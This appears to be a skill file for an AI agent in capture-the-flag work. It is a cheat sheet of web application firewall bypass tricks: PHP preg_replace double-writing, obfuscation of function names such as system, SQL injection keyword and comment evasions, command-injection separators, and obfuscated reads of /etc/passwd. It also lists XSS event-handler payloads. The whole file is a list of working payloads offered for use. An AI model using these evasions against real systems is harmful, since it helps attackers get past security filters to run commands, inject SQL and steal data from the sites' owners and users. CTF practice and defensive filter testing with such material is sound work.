---
name: waf-bypass
description: WAF Bypass trick library — All kindsWAFBypass method
---

# WAF Bypass trick library

## PHP WAF bypass

### preg_replace Double-write bypass (key tips)

`preg_replace()` meeting**loop replacement**Until there is no match, but if the keyword is replaced**Spelled out new keywords**, only the inner layer will be replaced and the outer layer will be retained.

**Core principles**:`preg_replace('/NSSCTF/', '', 'NSSNSSCTFCTF')` → Delete the middle `NSSCTF` → remain `NSS` + `CTF` = `NSSCTF`

**Universal template**:
```
Assume that the filter keyword is X(like NSSCTF)
Construct input: Xsplit in half, Embed complete in the middleX
Right now: Xfirst half + X + Xsecond half

Example:
filter NSSCTF → enter NSS + NSSCTF + CTF = NSSNSSCTFCTF
filter flag   → enter fl + flag + ag = flflagag
filter cat    → enter ca + cat + t = cacatt
filter system → enter sys + system + tem = syssystemtem
```

**Why simple case bypass doesn't work preg_replace**:
- `preg_replace('/NSSCTF/', '', 'NssCTF')` → `Nss` no match `NSS`(none i modifier)→ Output as is `NssCTF`
- `NssCTF !== "NSSCTF"`(Strict comparison fails)→ failed
- Only double-write bypass can allow replacement**Exactly get the original keyword string**

**⚠️ Identify the scene**:
- Source code contains `preg_replace('/keywords/', '', $input)` and need `$input` After replacement**equal to the keyword itself** → Immediately bypass with double write
- Do not attempt case bypassing (replacement is not equal to the original keyword) or encoding bypass (encoded string is not equal to the original keyword)

### Function name confusion
- Base64 Encoding recovery:`$f=base64_decode('c3lzdGVt');$f('id');`
- String concatenation:`$f='sys'.'tem';$f('id');`
- Variable functions:`$a='sys';$b='tem';$a$b('id');`

### keyword bypass
- Split path:`'/va'.'r/ww'.'w/ht'.'ml'`
- Comment bypass:`sys/**/tem('id');`
- Reverse a string:`$f=strrev('metsys');$f('id');`

## SQL Injection bypass

### keyword bypass
- Mixed case:`SeLeCt` replace `SELECT`
- Inline comments:`S/*!ELECT*/`
- Double encoding:`%2565` → `%65` → `e`
- Equivalent function:`GROUP_CONCAT` substitute `concat_ws`

### Comment variant
- `-- -` replace `--`
- `--+` replace `-- `
- `#` replace `--`

## Command injection bypass

### delimiter variations
- Newline character:`id\nwhoami`
- Pipe character:`id|whoami`
- Logical operations:`id&&whoami`
- child shell:`$(id)` or `` `id` ``

### Command confusion
- Variable splicing:`a=i;b=d;$a$b`
- Wildcard:`/bin/ca? /etc/pas?d`
- Empty variable:`c'a't /etc/passwd`
- Escape:`c\at /etc/passwd`

## XSS bypass

### Label variations
- `<img src=x onerror=alert(1)>`
- `<svg onload=alert(1)>`
- `<body onload=alert(1)>`
- `<input onfocus=alert(1) autofocus>`

### event handler
- `onerror`, `onload`, `onclick`, `onfocus`, `onmouseover`

### encoding bypass
- HTML Entity encoding
- Unicode coding
- Base64 Coding (matching eval)
